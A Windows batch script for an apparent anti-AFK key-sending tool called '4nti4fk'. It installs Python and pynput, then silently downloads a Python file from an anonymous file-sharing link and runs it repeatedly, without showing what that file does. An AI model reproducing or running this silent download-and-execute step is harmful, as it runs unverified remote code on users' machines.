::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::3fa0'franus::
:echo
    @echo off
:title
    title 4nti4fk by 3fa0'franus
:loading
    echo.
    echo.Loading.
        timeout 2 > NUL
    cls
    echo.
    echo.Loading..
        timeout 1 > NUL
    cls
:check
            if not exist "C:\Users\%username%\AppData\Local\Programs\Python" goto :hello
        if exist "C:\Users\%username%\AppData\Local\Programs\Python" goto :mainscreen
:hello
    ::choice
    color 4
    echo.
    echo. 
    echo. 
        set /P c=Python is not installed on pc to you want to install? [Y/N] 
    if /I "%c%" EQU "Y" goto :yespython
    if /I "%c%" EQU "N" goto :nopython
    echo.
    echo.
    goto :choice

:yespython
    curl -L --fail "https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe?raw=true" --output C:\4nti4fk\PythonInstaller.exe
    
        echo.
        echo.
        echo Downloading Complete.
    pause
        cd C:\4nti4fk\

    start PythonInstaller.exe
    cls
    echo. Launched Python Installer.
    echo.
    echo.
    echo. Press key if you installed Python.
    echo.
    pause
    cls
        goto :pynput
:nopython

    cls
    echo Exiting
    timeout 1 > NUL
    cls
    echo Exiting.
    timeout 1 > NUL
        cls
    echo Exiting..
    timeout 1 > NUL
    cls
    echo Exiting...
    timeout 1 > NUL
    cls
    echo Exiting....
    exit
:pynput
        py -m pip install pynput 
        cls
        goto :mainscreen
:mainscreen
   
    color 3
        echo.
        echo.
        echo.                                                                                       
        echo.                                                         ,,                 ,...          
        echo.                                                  mm     db               .d' ""`7MM      
        echo.                                                  MM                      dM`     MM      
        echo.                                ,AM   `7MMpMMMb.mmMMmm `7MM       ,AM    mMMmm    MM  ,MP'
        echo.                               AVMM     MM    MM  MM     MM      AVMM     MM      MM ;Y   
        echo.                             ,W' MM     MM    MM  MM     MM    ,W' MM     MM      MM;Mm   
        echo.                           ,W'   MM     MM    MM  MM     MM  ,W'   MM     MM      MM `Mb. 
        echo.                           AmmmmmMMmm .JMML  JMML.`Mbmo.JMML.AmmmmmMMmm .JMML.  .JMML. YA.
        echo.                                 MM                                MM                     
        echo.                                 MM                                MM                     
        echo.                                                     by 3fa0'franus
        echo.
        echo.
        echo.
        echo.
        echo.                                                 Welcome to 4nti4fk
        echo.
        echo.                                   Click to continue and download necessary files
        echo.
        echo.
        echo.
    pause

:directory
    mkdir C:\4nti4fk >nul 2>&1
    mkdir C:\4nti4fk\assets >nul 2>&1
    curl -L --silent --fail "https://one.liteshare.co/download.php?id=3H6UWL7?raw=true" --output C:\4nti4fk\assets\main-asset.py
    cls
        echo. 
        echo. 
        echo. Creating directory.
    timeout 2 >nul

:choicetime
    cls
    set /P time=What time break in between key send? 


:choicesend
    echo.
    echo. 
    echo. 
    set /P c=Are you sure you want to start sending keys? [Y/N] 
    if /I "%c%" EQU "Y" goto :accept
    if /I "%c%" EQU "N" goto :nonaccept
        goto :choice


:accept
    powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, '4nti4fk by 3fa0 franus', 'Started sending keys.', [System.Windows.Forms.ToolTipIcon]::None)}"
    cls
        cd ..
        cd ..
        cd C:\4nti4fk\assets
    color 4
    echo.
    echo.Starting.
        timeout 2 > NUL
    echo.
    echo.
    echo.
    echo.
    :loop
    echo.
    timeout %time% > NUL
 py main-asset.py
    echo.
    echo.
    echo.
    echo.
    echo. Sended!
    goto :loop


:nonaccept
        cls
    echo Exiting
    timeout 1 > NUL
        cls
    echo Exiting.
    timeout 1 > NUL
        cls
    echo Exiting..
    timeout 1 > NUL
        cls
    echo Exiting...
    timeout 1 > NUL
        cls
    echo Exiting....
    exit